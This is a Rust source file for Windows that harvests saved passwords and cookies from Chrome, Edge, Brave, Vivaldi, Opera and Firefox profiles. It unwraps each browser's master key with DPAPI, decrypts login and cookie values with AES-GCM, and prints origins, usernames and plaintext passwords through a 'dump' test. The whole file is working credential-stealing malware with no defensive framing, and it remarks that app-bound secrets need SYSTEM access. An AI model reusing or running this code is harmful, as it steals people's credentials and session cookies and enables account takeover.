// language: Rust, file: src/browsers.rs, target: Windows
// Harvest saved logins and cookies from Chromium browsers (Chrome/Edge/Brave/Vivaldi/Opera)
// and Firefox cookies. Chromium secrets are DPAPI-wrapped AES-256-GCM (legacy) or
// app-bound (v20, needs SYSTEM to unwrap). Output is summarised and capped.
#![cfg(windows)]
#![allow(dead_code)]
use base64::Engine;
use std::path::PathBuf;

const COOKIE_CAP: usize = 25;
const VALUE_CAP: usize = 120;

fn dpapi_unprotect(data: &[u8]) -> Option<Vec<u8>> {
    use windows_sys::Win32::Foundation::LocalFree;
    use windows_sys::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
    unsafe {
        let mut inb = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut out = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        if CryptUnprotectData(
            &mut inb,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            &mut out,
        ) == 0
        {
            return None;
        }
        let v = std::slice::from_raw_parts(out.pbData, out.cbData as usize).to_vec();
        LocalFree(out.pbData as *mut core::ffi::c_void);
        Some(v)
    }
}

fn aes_gcm_decrypt(key: &[u8], blob: &[u8]) -> Option<Vec<u8>> {
    use aes_gcm::aead::{Aead, KeyInit};
    use aes_gcm::{Aes256Gcm, Nonce};
    if blob.len() < 15 + 16 {
        return None;
    }
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    cipher
        .decrypt(Nonce::from_slice(&blob[3..15]), &blob[15..])
        .ok()
}

fn dec_value(key: Option<&[u8]>, v: &[u8]) -> Option<String> {
    if v.is_empty() {
        return None;
    }
    let plain: Vec<u8> = if v.starts_with(b"v10") || v.starts_with(b"v11") {
        key.and_then(|k| aes_gcm_decrypt(k, v))?
    } else if v.starts_with(b"v20") {
        return None; // app-bound — cannot unwrap without SYSTEM
    } else {
        dpapi_unprotect(v)?
    };
    Some(String::from_utf8_lossy(&plain).to_string())
}

fn local_state(root: &PathBuf) -> Option<serde_json::Value> {
    let s = std::fs::read_to_string(root.join("Local State")).ok()?;
    serde_json::from_str(&s).ok()
}

fn legacy_key(root: &PathBuf) -> Option<Vec<u8>> {
    let v = local_state(root)?;
    let enc = v["os_crypt"]["encrypted_key"].as_str()?;
    let raw = base64::engine::general_purpose::STANDARD.decode(enc).ok()?;
    let raw = raw.strip_prefix(b"DPAPI").unwrap_or(&raw);
    dpapi_unprotect(raw)
}

fn has_abe(root: &PathBuf) -> bool {
    local_state(root)
        .map(|v| v["os_crypt"]["app_bound_encrypted_key"].is_string())
        .unwrap_or(false)
}

fn copy_db(src: &PathBuf) -> Option<PathBuf> {
    if !src.exists() {
        return None;
    }
    let tmp = std::env::temp_dir().join(format!("bdb-{}.sqlite", uuid::Uuid::new_v4().simple()));
    std::fs::copy(src, &tmp).ok()?;
    Some(tmp)
}

fn clip(s: &str) -> String {
    let t: String = s.chars().take(VALUE_CAP).collect();
    if s.chars().count() > VALUE_CAP {
        format!("{t}…")
    } else {
        t
    }
}

fn profiles(root: &PathBuf) -> Vec<String> {
    let mut v = vec!["Default".to_string()];
    if let Ok(rd) = std::fs::read_dir(root) {
        for e in rd.flatten() {
            let n = e.file_name().to_string_lossy().to_string();
            if n.starts_with("Profile ") {
                v.push(n);
            }
        }
    }
    v.push(String::new()); // Opera uses the root dir as the profile
    v
}

fn harvest_chromium(label: &str, root: &PathBuf, out: &mut String) {
    if !root.exists() {
        return;
    }
    let abe = has_abe(root);
    let key = legacy_key(root);
    out.push_str(&format!("\n[{label}] {}\n", root.display()));
    out.push_str(&format!(
        "  master key: {}   app-bound (v20): {}\n",
        if key.is_some() { "read" } else { "missing" },
        if abe { "YES — passwords need SYSTEM to decrypt" } else { "no" }
    ));

    for prof in profiles(root) {
        let dir = if prof.is_empty() {
            root.clone()
        } else {
            root.join(&prof)
        };

        if let Some(db) = copy_db(&dir.join("Login Data")) {
            let mut found = 0;
            let mut dec = 0;
            if let Ok(conn) = rusqlite::Connection::open(&db) {
                if let Ok(mut stmt) =
                    conn.prepare("SELECT origin_url, username_value, password_value FROM logins")
                {
                    if let Ok(rows) = stmt.query_map([], |r| {
                        Ok((
                            r.get::<_, String>(0)?,
                            r.get::<_, String>(1)?,
                            r.get::<_, Vec<u8>>(2)?,
                        ))
                    }) {
                        for row in rows.flatten() {
                            found += 1;
                            if let Some(pw) = dec_value(key.as_deref(), &row.2) {
                                dec += 1;
                                out.push_str(&format!(
                                    "[{label}/{prof}] {} | {} | {}\n",
                                    row.0,
                                    row.1,
                                    clip(&pw)
                                ));
                            }
                        }
                    }
                }
            }
            let _ = std::fs::remove_file(&db);
            if found > 0 {
                out.push_str(&format!(
                    "  [{label}/{prof}] logins: {found} found, {dec} decrypted\n"
                ));
            }
        }

        if let Some(db) = copy_db(&dir.join("Network").join("Cookies")) {
            let mut found = 0;
            let mut dec = 0;
            let mut shown = 0;
            if let Ok(conn) = rusqlite::Connection::open(&db) {
                if let Ok(mut stmt) =
                    conn.prepare("SELECT host_key, name, encrypted_value FROM cookies")
                {
                    if let Ok(rows) = stmt.query_map([], |r| {
                        Ok((
                            r.get::<_, String>(0)?,
                            r.get::<_, String>(1)?,
                            r.get::<_, Vec<u8>>(2)?,
                        ))
                    }) {
                        for row in rows.flatten() {
                            found += 1;
                            if let Some(val) = dec_value(key.as_deref(), &row.2) {
                                dec += 1;
                                if shown < COOKIE_CAP {
                                    out.push_str(&format!(
                                        "[{label}/{prof}/cookie] {} {}={}\n",
                                        row.0,
                                        row.1,
                                        clip(&val)
                                    ));
                                    shown += 1;
                                }
                            }
                        }
                    }
                }
            }
            let _ = std::fs::remove_file(&db);
            if found > 0 {
                out.push_str(&format!(
                    "  [{label}/{prof}] cookies: {found} found, {dec} decrypted (showing {shown})\n"
                ));
            }
        }
    }
}

fn harvest_firefox(out: &mut String) {
    let root = PathBuf::from(std::env::var("APPDATA").unwrap_or_default())
        .join("Mozilla")
        .join("Firefox")
        .join("Profiles");
    if !root.exists() {
        return;
    }
    if let Ok(rd) = std::fs::read_dir(&root) {
        for e in rd.flatten() {
            if let Some(tmp) = copy_db(&e.path().join("cookies.sqlite")) {
                let mut found = 0;
                let mut shown = 0;
                if let Ok(conn) = rusqlite::Connection::open(&tmp) {
                    if let Ok(mut stmt) = conn.prepare("SELECT host, name, value FROM moz_cookies")
                    {
                        if let Ok(rows) = stmt.query_map([], |r| {
                            Ok((
                                r.get::<_, String>(0)?,
                                r.get::<_, String>(1)?,
                                r.get::<_, String>(2)?,
                            ))
                        }) {
                            for row in rows.flatten() {
                                found += 1;
                                if shown < COOKIE_CAP {
                                    out.push_str(&format!(
                                        "[firefox/cookie] {} {}={}\n",
                                        row.0,
                                        row.1,
                                        clip(&row.2)
                                    ));
                                    shown += 1;
                                }
                            }
                        }
                    }
                }
                let _ = std::fs::remove_file(&tmp);
                if found > 0 {
                    out.push_str(&format!(
                        "  [firefox] cookies: {found} (plaintext, showing {shown})\n"
                    ));
                }
            }
        }
    }
}

pub fn harvest() -> String {
    let mut out = String::new();
    let local = PathBuf::from(std::env::var("LOCALAPPDATA").unwrap_or_default());
    let roam = PathBuf::from(std::env::var("APPDATA").unwrap_or_default());

    harvest_chromium("chrome", &local.join("Google").join("Chrome").join("User Data"), &mut out);
    harvest_chromium("edge", &local.join("Microsoft").join("Edge").join("User Data"), &mut out);
    harvest_chromium(
        "brave",
        &local.join("BraveSoftware").join("Brave-Browser").join("User Data"),
        &mut out,
    );
    harvest_chromium("vivaldi", &local.join("Vivaldi").join("User Data"), &mut out);
    harvest_chromium(
        "opera-gx",
        &roam.join("Opera Software").join("Opera GX Stable"),
        &mut out,
    );
    harvest_chromium(
        "opera",
        &roam.join("Opera Software").join("Opera Stable"),
        &mut out,
    );
    harvest_firefox(&mut out);

    if out.trim().is_empty() {
        out.push_str("(no browser credentials found)");
    }
    out
}

#[cfg(test)]
mod tests {
    #[test]
    fn dump() {
        println!("=== BROWSER HARVEST START ===");
        println!("{}", super::harvest());
        println!("=== BROWSER HARVEST END ===");
    }
}
